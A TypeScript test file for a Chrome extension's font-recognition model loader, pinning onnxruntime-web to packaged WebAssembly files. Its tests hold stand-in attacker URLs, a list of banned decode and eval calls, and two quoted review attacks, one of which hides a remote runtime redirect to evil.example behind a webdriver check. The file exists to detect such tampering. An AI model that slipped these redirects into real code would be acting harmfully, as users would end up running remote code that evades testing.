import { readFileSync } from 'node:fs';
import ts from 'typescript';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { VENDOR_FILES } from '../../scripts/lib/vendor';
import {
  META_PATH,
  MODEL_PATH,
  RUNTIME_DIR,
  assertNoOutsideLoads,
  assertPinnedRuntime,
  configureRuntime,
  loadModel,
  metaUrl,
  modelUrl,
  runtimeUrl,
} from '../../src/result/model';
import { at } from '../../src/shared/core/at';
import type { Img } from '../../src/shared/core/image';
import type { Meta } from '../../src/shared/core/ranker';
import { createChromeStub } from './helpers/chrome-stub';
import { functionText, surfaceOf } from './helpers/surface';

const ortMock = vi.hoisted(() => {
  const emptyEnv = (): Record<string, unknown> => ({});
  const run = vi.fn();
  const create = vi.fn();
  class Tensor {
    constructor(
      public type: string,
      public data: Float32Array,
      public dims: number[],
    ) {}
  }
  return {
    env: { wasm: emptyEnv() },
    InferenceSession: { create },
    Tensor,
    run,
  };
});
vi.mock('onnxruntime-web/wasm', () => ortMock);

const META: Meta = {
  fams: ['inter', 'roboto'],
  display: ['Inter', 'Roboto'],
  inGF: [true, true],
  category: ['Sans Serif', 'Sans Serif'],
  rank: [1, 2],
  classFam: [0, 1],
  merge: {},
  keepNoto: [],
};
const white = (w: number, h: number): Img => ({
  w,
  h,
  c: 1,
  data: new Uint8Array(w * h).fill(255),
});

beforeEach(() => {
  createChromeStub().install();
  ortMock.env.wasm = {};
  ortMock.InferenceSession.create.mockReset().mockResolvedValue({ run: ortMock.run });
  ortMock.run.mockReset().mockResolvedValue({ logits: { data: Float32Array.from([0, 0]) } });
  vi.stubGlobal(
    'fetch',
    vi.fn(() => Promise.resolve({ json: () => Promise.resolve(META) })),
  );
  vi.stubGlobal('navigator', { hardwareConcurrency: 8 });
  vi.stubGlobal('crossOriginIsolated', true);
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe('loadModel', () => {
  it('points onnxruntime at the bundled runtime and uses up to 4 threads when cross-origin isolated', async () => {
    await loadModel();
    expect(ortMock.env.wasm['wasmPaths']).toBe('chrome-extension://test-extension-id/ort/');
    expect(ortMock.env.wasm['numThreads']).toBe(4);
  });

  it.each([
    [true, 2, 2],
    [true, 16, 4],
    [true, 0, 1],
    [false, 16, 1],
  ])('isolated=%s with %s cores → %s thread(s)', async (isolated, cores, threads) => {
    vi.stubGlobal('crossOriginIsolated', isolated);
    vi.stubGlobal('navigator', { hardwareConcurrency: cores });
    await loadModel();
    expect(ortMock.env.wasm['numThreads']).toBe(threads);
  });

  it('reads the family table and creates the session from the packaged files', async () => {
    await loadModel();
    expect(fetch).toHaveBeenCalledExactlyOnceWith(
      'chrome-extension://test-extension-id/model/meta.json',
    );
    expect(ortMock.InferenceSession.create).toHaveBeenCalledExactlyOnceWith(
      'chrome-extension://test-extension-id/model/model_fp16.onnx',
      { executionProviders: ['wasm'], graphOptimizationLevel: 'all' },
    );
  });

  it('ranks with the family table it loaded', async () => {
    const model = await loadModel();
    const top = model.ranker.rank([[0.1, 0.9]], { alpha: 0, merge: false, k: 2 });
    expect(top.map((o) => o.name)).toEqual(['Roboto', 'Inter']);
  });

  it('turns an image into class probabilities with one 320x320 float32 NCHW tensor', async () => {
    ortMock.run.mockResolvedValue({ logits: { data: Float32Array.from([0, Math.log(3)]) } });
    const model = await loadModel();
    const probs = await model.probs(white(40, 20));
    const feeds = at(
      ortMock.run.mock.calls as [{ input: InstanceType<typeof ortMock.Tensor> }][],
      0,
    )[0];
    expect(feeds.input.type).toBe('float32');
    expect(feeds.input.dims).toEqual([1, 3, 320, 320]);
    expect(feeds.input.data).toHaveLength(3 * 320 * 320);
    expect(at(probs, 0)).toBeCloseTo(0.25, 6);
    expect(at(probs, 1)).toBeCloseTo(0.75, 6);
  });

  it('fails when the family table cannot be read or the model cannot be created', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.reject(new Error('no meta'))),
    );
    await expect(loadModel()).rejects.toThrow('no meta');
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.resolve({ json: () => Promise.resolve(META) })),
    );
    ortMock.InferenceSession.create.mockRejectedValue(new Error('bad model'));
    await expect(loadModel()).rejects.toThrow('bad model');
  });
});

// src/result/model.ts is the only file that may import or configure onnxruntime-web (eslint.config.js refuses the
// names env/wasmPaths/wasmBinary and the import everywhere else). What it does to the runtime is pinned here, because
// env.wasm.wasmPaths (another URL, another .wasm) and env.wasm.wasmBinary (other bytes) would run WebAssembly past
// the pinned files of scripts/lib/vendor.ts with every build check green.
describe('the runtime is configured to load only the packaged, pinned files', () => {
  it('sets wasmPaths to the one string chrome.runtime.getURL("ort/"), never an object or another URL', async () => {
    await loadModel();
    const { wasmPaths } = ortMock.env.wasm;
    expect(typeof wasmPaths).toBe('string');
    expect(wasmPaths).toBe('chrome-extension://test-extension-id/ort/');
    expect(wasmPaths).toBe(chrome.runtime.getURL('ort/'));
  });

  it('does not set wasmBinary, or anything but wasmPaths and numThreads', async () => {
    await loadModel();
    expect(ortMock.env.wasm['wasmBinary']).toBeUndefined();
    expect(Object.keys(ortMock.env.wasm).sort()).toEqual(['numThreads', 'wasmPaths']);
  });

  it('configureRuntime() alone does exactly that, on any environment', () => {
    const env = { wasm: {} };
    configureRuntime(env);
    expect(Object.keys(env.wasm).sort()).toEqual(['numThreads', 'wasmPaths']);
    expect(Object.keys(env)).toEqual(['wasm']);
  });

  it('loads the model and the family table from exactly their packaged URLs', async () => {
    await loadModel();
    expect(modelUrl()).toBe('chrome-extension://test-extension-id/model/model_fp16.onnx');
    expect(metaUrl()).toBe('chrome-extension://test-extension-id/model/meta.json');
    expect(runtimeUrl()).toBe('chrome-extension://test-extension-id/ort/');
    expect(ortMock.InferenceSession.create.mock.calls[0]?.[0]).toBe(modelUrl());
    expect(vi.mocked(fetch).mock.calls[0]?.[0]).toBe(metaUrl());
  });

  it('points at paths that are in the pinned list of vendor files', () => {
    expect(RUNTIME_DIR).toBe('ort/');
    expect(VENDOR_FILES.has(MODEL_PATH)).toBe(true);
    expect(VENDOR_FILES.has(META_PATH)).toBe(true);
    // the runtime directory holds exactly the three runtime files of the list
    const inRuntime = [...VENDOR_FILES.keys()].filter((path) => path.startsWith(RUNTIME_DIR));
    expect(inRuntime.sort()).toEqual([
      'ort/ort-wasm-simd-threaded.mjs',
      'ort/ort-wasm-simd-threaded.wasm',
      'ort/ort.wasm.min.mjs',
    ]);
  });

  describe('the source of src/result/model.ts', () => {
    const text = readFileSync('src/result/model.ts', 'utf8');
    const source = ts.createSourceFile('model.ts', text, ts.ScriptTarget.Latest, true);

    /** Property-access chains rooted at `ort`, outermost only, as written: ort.env.wasm.numThreads. */
    function ortChains(): string[] {
      const chains: string[] = [];
      const visit = (node: ts.Node): void => {
        if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
          let root: ts.Expression = node;
          while (ts.isPropertyAccessExpression(root) || ts.isElementAccessExpression(root)) {
            root = root.expression;
          }
          if (ts.isIdentifier(root) && root.text === 'ort') {
            chains.push(node.getText(source));
            return;
          }
        }
        ts.forEachChild(node, visit);
      };
      visit(source);
      return chains;
    }

    it('uses the runtime in exactly three ways: its environment (handed to configureRuntime), InferenceSession.create, Tensor', () => {
      expect(ortChains().sort()).toEqual([
        'ort.InferenceSession.create',
        'ort.Tensor',
        'ort.env',
        'ort.env',
      ]);
      expect(text.match(/\bort\.env\b/g)).toHaveLength(2);
      expect(text).toContain('configureRuntime(ort.env);');
      expect(text).toContain('assertPinnedRuntime(ort.env, runtimeUrl());');
    });

    it('assigns to the environment in exactly two places: wasmPaths and numThreads', () => {
      const assigned: string[] = [];
      const visit = (node: ts.Node): void => {
        if (
          ts.isBinaryExpression(node) &&
          node.operatorToken.kind >= ts.SyntaxKind.FirstAssignment &&
          node.operatorToken.kind <= ts.SyntaxKind.LastAssignment &&
          /\benv\b/.test(node.left.getText(source))
        ) {
          assigned.push(node.left.getText(source));
        }
        ts.forEachChild(node, visit);
      };
      visit(source);
      expect(assigned.sort()).toEqual(['env.wasm.numThreads', 'env.wasm.wasmPaths']);
    });

    it('has no way around that: no wasmBinary, no object for wasmPaths, no Object.assign/Reflect/defineProperty, no other import', () => {
      expect(text).not.toMatch(
        /Object\.(assign|defineProperty|defineProperties)|Reflect\.|\bWebAssembly\b/,
      );
      expect(text).not.toMatch(/\bimport\s*\(|(^|[^-\w])eval\s*\(|\bnew Function\b/);
      const imports = source.statements
        .filter(ts.isImportDeclaration)
        .map((statement) => statement.moduleSpecifier.getText(source));
      expect(imports[0]).toBe("'onnxruntime-web/wasm'");
      expect(imports.slice(1).every((specifier) => specifier.startsWith("'../shared/core/"))).toBe(
        true,
      );
    });

    it('takes every URL from runtimeUrl(), modelUrl() and metaUrl(), which are built from chrome.runtime.getURL', () => {
      const urls = [...text.matchAll(/chrome\.runtime\.getURL\(([^)]*)\)/g)].map(
        (match) => match[1],
      );
      expect(urls.sort()).toEqual(["''", 'META_PATH', 'MODEL_PATH', 'RUNTIME_DIR']);
      expect(text).not.toMatch(/https?:|\/\/cdn|'\/\/'/);
    });
  });
});

// The values are checked, not only the way they are set (review of PR #6): whatever source line set them, the
// runtime must still point at the packaged directory, with no override of its bytes, when the session is created.
describe('assertPinnedRuntime: the runtime points only at the packaged files when it starts', () => {
  const PINNED = 'chrome-extension://test-extension-id/ort/';
  const envWith = (wasm: object) => ({ wasm });

  it('accepts the packaged directory and no binary', () => {
    expect(() => {
      assertPinnedRuntime(envWith({ wasmPaths: PINNED, numThreads: 4 }), PINNED);
    }).not.toThrow();
  });

  it.each([
    ['another origin', 'https://evil.example/ort/'],
    ['an encoded origin', '%68ttps://evil.example/ort/'],
    ['a protocol-relative URL', '//evil.example/ort/'],
    ['the packaged directory plus a suffix', `${PINNED}x/`],
    ['the packaged directory without its slash', PINNED.slice(0, -1)],
    ['another extension', 'chrome-extension://other-id/ort/'],
    ['an upper-case spelling', PINNED.toUpperCase()],
    ['a data: URL', 'data:text/javascript,1'],
    ['an empty string', ''],
  ])('refuses wasmPaths %s', (_what, value) => {
    expect(() => {
      assertPinnedRuntime(envWith({ wasmPaths: value }), PINNED);
    }).toThrow(/wasmPaths/);
  });

  it.each([
    ['an object', { mjs: `${PINNED}ort-wasm-simd-threaded.mjs`, wasm: 'https://evil.example/x' }],
    ['a frozen object', Object.freeze({ mjs: PINNED, wasm: PINNED })],
    ['a URL object', new URL('https://evil.example/ort/')],
    ['a String object', new String(PINNED)],
    ['an array', [PINNED]],
    ['null', null],
    ['undefined', undefined],
    ['a number', 1],
  ])('refuses wasmPaths that is %s, even if it prints like the right string', (_what, value) => {
    expect(() => {
      assertPinnedRuntime(envWith({ wasmPaths: value }), PINNED);
    }).toThrow(/wasmPaths/);
  });

  it('refuses a wasmPaths that is a getter (it could answer differently later)', () => {
    const wasm = {};
    Object.defineProperty(wasm, 'wasmPaths', { get: () => PINNED, enumerable: true });
    expect(() => {
      assertPinnedRuntime(envWith(wasm), PINNED);
    }).toThrow(/wasmPaths/);
  });

  it.each([
    ['bytes', new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])],
    ['an ArrayBuffer', new ArrayBuffer(8)],
    ['an empty array', []],
    ['false', false],
    ['zero', 0],
    ['an empty string', ''],
    ['null', null],
  ])('refuses a wasmBinary that is %s', (_what, value) => {
    expect(() => {
      assertPinnedRuntime(envWith({ wasmPaths: PINNED, wasmBinary: value }), PINNED);
    }).toThrow(/wasmBinary/);
  });

  it('refuses a wasmBinary that is defined but undefined, or a getter, or inherited', () => {
    expect(() => {
      assertPinnedRuntime(envWith({ wasmPaths: PINNED, wasmBinary: undefined }), PINNED);
    }).toThrow(/wasmBinary/);
    const getter = { wasmPaths: PINNED };
    Object.defineProperty(getter, 'wasmBinary', { get: () => undefined });
    expect(() => {
      assertPinnedRuntime(envWith(getter), PINNED);
    }).toThrow(/wasmBinary/);
    const inherited = Object.create({ wasmBinary: new Uint8Array(1) }) as Record<string, unknown>;
    inherited['wasmPaths'] = PINNED;
    expect(() => {
      assertPinnedRuntime(envWith(inherited), PINNED);
    }).toThrow(/wasmBinary/);
  });

  it('refuses a wasmBinary that arrives through Object.prototype (prototype pollution)', () => {
    Object.defineProperty(Object.prototype, 'wasmBinary', {
      value: new Uint8Array(1),
      configurable: true,
    });
    try {
      expect(() => {
        assertPinnedRuntime(envWith({ wasmPaths: PINNED }), PINNED);
      }).toThrow(/wasmBinary/);
    } finally {
      Reflect.deleteProperty(Object.prototype, 'wasmBinary');
    }
  });
});

describe('assertNoOutsideLoads: nothing came from outside the extension while the runtime started', () => {
  const BASE = 'chrome-extension://test-extension-id/';
  const entry = (name: string) => ({ name }) as PerformanceEntry;

  it('accepts no entries, and entries of the extension itself', () => {
    expect(() => {
      assertNoOutsideLoads([], BASE);
    }).not.toThrow();
    expect(() => {
      assertNoOutsideLoads(
        [entry(`${BASE}ort/ort-wasm-simd-threaded.wasm`), entry(`${BASE}model/model_fp16.onnx`)],
        BASE,
      );
    }).not.toThrow();
  });

  it.each([
    'https://evil.example/b',
    'http://127.0.0.1/x',
    'blob:chrome-extension://test-extension-id/1',
    'data:application/wasm;base64,AGFzbQ==',
    'chrome-extension://other-id/ort/ort-wasm-simd-threaded.wasm',
    `${BASE.slice(0, -1)}evil/x`,
    '//evil.example/b',
  ])('refuses a load from %s', (name) => {
    expect(() => {
      assertNoOutsideLoads([entry(`${BASE}a`), entry(name)], BASE);
    }).toThrow(/outside the extension/);
  });
});

describe('loadModel starts the runtime only when the checks hold', () => {
  it('stops before the session exists when something resets wasmPaths after it was set', async () => {
    let stored: unknown;
    Object.defineProperty(ortMock.env.wasm, 'wasmPaths', {
      get: () => 'https://evil.example/ort/',
      set: (value: unknown) => {
        stored = value;
      },
      configurable: true,
      enumerable: true,
    });
    await expect(loadModel()).rejects.toThrow(/wasmPaths/);
    expect(stored).toBe('chrome-extension://test-extension-id/ort/');
    expect(ortMock.InferenceSession.create).not.toHaveBeenCalled();
  });

  it('stops before the session exists when a binary is present', async () => {
    ortMock.env.wasm['wasmBinary'] = new Uint8Array([0, 97, 115, 109]);
    await expect(loadModel()).rejects.toThrow(/wasmBinary/);
    expect(ortMock.InferenceSession.create).not.toHaveBeenCalled();
  });

  it('fails after the session when a resource was loaded from outside the extension', async () => {
    vi.stubGlobal('performance', {
      getEntriesByType: () => [{ name: 'https://evil.example/b' }],
    });
    await expect(loadModel()).rejects.toThrow(/outside the extension/);
  });

  it('succeeds with the resource entries of the extension only', async () => {
    vi.stubGlobal('performance', {
      getEntriesByType: () => [
        { name: 'chrome-extension://test-extension-id/ort/ort-wasm-simd-threaded.wasm' },
      ],
    });
    await expect(loadModel()).resolves.toBeDefined();
  });
});

// An allowlist of what src/result/model.ts may do (review round 2 of PR #6): pinning how the runtime is configured left
// room for the VALUE to be computed (decodeURI of an environment-dependent string, an object in Object.freeze). Here the
// file cannot gain a call, a string literal, a property it reads, a condition or an operator without this test changing.
describe('the surface of src/result/model.ts is an allowlist', () => {
  const text = readFileSync('src/result/model.ts', 'utf8');

  it('says where the packaged files are in exactly three constants', () => {
    expect(functionText(text, 'RUNTIME_DIR')).toBe("export const RUNTIME_DIR = 'ort/';");
    expect(functionText(text, 'MODEL_PATH')).toBe(
      "export const MODEL_PATH = 'model/model_fp16.onnx';",
    );
    expect(functionText(text, 'META_PATH')).toBe("export const META_PATH = 'model/meta.json';");
    expect(RUNTIME_DIR).toBe('ort/');
  });

  it('builds each URL with exactly chrome.runtime.getURL of its constant, nothing wrapped, decoded or conditional', () => {
    expect(functionText(text, 'runtimeUrl')).toBe(
      'export const runtimeUrl = (): string => chrome.runtime.getURL(RUNTIME_DIR);',
    );
    expect(functionText(text, 'modelUrl')).toBe(
      'export const modelUrl = (): string => chrome.runtime.getURL(MODEL_PATH);',
    );
    expect(functionText(text, 'metaUrl')).toBe(
      'export const metaUrl = (): string => chrome.runtime.getURL(META_PATH);',
    );
  });

  it('sets the runtime in exactly one way: wasmPaths = runtimeUrl() (a bare call, no wrapper), then numThreads', () => {
    expect(functionText(text, 'configureRuntime')).toBe(
      'export function configureRuntime(env: { wasm: { wasmPaths?: string | object; numThreads?: number; }; }): void { ' +
        'env.wasm.wasmPaths = runtimeUrl(); ' +
        'env.wasm.numThreads = globalThis.crossOriginIsolated ? Math.min(4, navigator.hardwareConcurrency || 1) : 1; }',
    );
  });

  it('checks the start of the runtime in exactly the two functions that are tested above', () => {
    expect(functionText(text, 'assertPinnedRuntime')).toContain(
      "Object.getOwnPropertyDescriptor(wasm, 'wasmPaths')",
    );
    expect(functionText(text, 'assertPinnedRuntime')).toContain('paths.value !== expected');
    expect(functionText(text, 'assertNoOutsideLoads')).toContain(
      'entries.find((entry) => !entry.name.startsWith(base))',
    );
  });

  it('starts the session exactly as the one pinned text of loadModel says (the yield for resource timing included)', () => {
    expect(functionText(text, 'loadModel')).toBe(
      "export async function loadModel(): Promise<Model> { configureRuntime(ort.env); const meta = (await (await fetch(metaUrl())).json()) as Meta; const ranker = makeRanker(meta); assertPinnedRuntime(ort.env, runtimeUrl()); const session = await ort.InferenceSession.create(modelUrl(), { executionProviders: ['wasm'], graphOptimizationLevel: 'all', }); await new Promise<void>((resolve) => setTimeout(resolve, 0)); assertNoOutsideLoads(performance.getEntriesByType('resource'), chrome.runtime.getURL('')); return { ranker, probs: async (crop) => { const out = await session.run({ input: new ort.Tensor('float32', prep(crop), [1, 3, 320, 320]), }); return softmax(out['logits']?.data as Float32Array); }, }; }",
    );
  });

  it('calls only these functions and constructors (and one timer, the yield above)', () => {
    const calls = surfaceOf(text).calls;
    expect(calls.filter((call) => /^set[A-Z]/.test(call))).toHaveLength(1);
    expect(calls.filter((call) => !/^set[A-Z]/.test(call))).toEqual([
      '(await fetch(metaUrl())).json',
      'Math.min',
      'Object.getOwnPropertyDescriptor',
      'assertNoOutsideLoads',
      'assertPinnedRuntime',
      'chrome.runtime.getURL',
      'configureRuntime',
      'entries.find',
      'entry.name.startsWith',
      'fetch',
      'makeRanker',
      'metaUrl',
      'modelUrl',
      'new Error',
      'new Promise',
      'new ort.Tensor',
      'ort.InferenceSession.create',
      'performance.getEntriesByType',
      'prep',
      'runtimeUrl',
      'session.run',
      'softmax',
    ]);
  });

  it('contains only these string literals: no URL, no encoded text, nothing to decode', () => {
    expect(surfaceOf(text).strings).toEqual([
      '',
      ' (the packaged runtime).',
      ' was loaded from outside the extension while the runtime started.',
      '../shared/core/image',
      '../shared/core/pipeline',
      '../shared/core/ranker',
      'Refusing to continue: ',
      'Refusing to start: wasmBinary must not be set (the runtime would run other bytes).',
      'Refusing to start: wasmPaths must be exactly ',
      'all',
      'float32',
      'logits',
      'model/meta.json',
      'model/model_fp16.onnx',
      'onnxruntime-web/wasm',
      'ort/',
      'resource',
      'string',
      'wasm',
      'wasmBinary',
      'wasmPaths',
    ]);
  });

  it('reads only these properties: nothing about the environment beyond what is listed', () => {
    expect(surfaceOf(text).accesses).toEqual([
      '(await fetch(metaUrl())).json',
      'Math.min',
      'Object.getOwnPropertyDescriptor',
      'chrome.runtime',
      'chrome.runtime.getURL',
      'entries.find',
      'entry.name',
      'entry.name.startsWith',
      'env.wasm',
      'env.wasm.numThreads',
      'env.wasm.wasmPaths',
      'globalThis.crossOriginIsolated',
      'navigator.hardwareConcurrency',
      'ort.InferenceSession',
      'ort.InferenceSession.create',
      'ort.Tensor',
      'ort.env',
      "out['logits']",
      "out['logits']?.data",
      'outside.name',
      'paths.value',
      'performance.getEntriesByType',
      'session.run',
    ]);
  });

  it('has exactly one condition (the thread count) and only these operators and constructs', () => {
    const surface = surfaceOf(text);
    expect(surface.conditionals).toBe(1);
    expect(surface.operators).toEqual(['!', '!==', '=', '===', 'typeof', '||']);
    expect(surface.constructs).toEqual([
      'array literal',
      'await',
      'element access',
      'function expression',
      'object literal',
    ]);
  });

  it.each([
    'decodeURI',
    'decodeURIComponent',
    'unescape',
    'atob',
    'String.fromCharCode',
    'String.raw',
    'Object.freeze',
    'Object.assign',
    'Object.defineProperty',
    'Reflect.get',
    'JSON.parse',
    'eval',
    'Function',
    'importScripts',
    'import',
  ])('has no call of %s', (name) => {
    expect(surfaceOf(text).calls.some((call) => call === name || call.endsWith(`.${name}`))).toBe(
      false,
    );
  });

  it.each([
    'navigator.webdriver',
    'location.href',
    'chrome.runtime.getManifest',
    'navigator.userAgent',
    'document',
  ])('does not look at %s: the value must not depend on where the code runs', (access) => {
    expect(surfaceOf(text).accesses).not.toContain(access);
  });

  it('how the surface helper sees the attacks of the review (it would catch them)', () => {
    const attack = [
      'env.wasm.wasmPaths = decodeURI("getManifest" in chrome.runtime && !navigator.webdriver ? "%68ttps://evil.example/ort/" : runtimeUrl());',
      'env.wasm.wasmPaths = Object.freeze({ mjs: runtimeUrl(), wasm: "https://evil.example/x" });',
    ];
    for (const code of attack) {
      const surface = surfaceOf(code);
      expect(surface.calls.join()).toMatch(/decodeURI|Object\.freeze/);
      expect(surface.strings.join()).toMatch(/evil/);
    }
    expect(surfaceOf(attack[0] ?? '').accesses).toContain('navigator.webdriver');
    expect(surfaceOf(attack[0] ?? '').operators).toContain('in');
  });
});
